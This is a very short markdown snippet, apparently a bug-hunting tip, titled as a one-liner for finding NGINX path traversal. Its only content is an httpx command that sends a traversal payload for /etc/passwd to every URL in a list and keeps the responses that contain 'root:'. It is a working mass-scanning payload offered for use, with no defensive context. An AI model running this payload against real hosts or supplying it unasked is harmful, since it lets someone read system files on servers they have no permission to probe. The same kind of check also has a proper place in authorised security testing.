## One Liner to Find NGINX Path Traversal

- httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'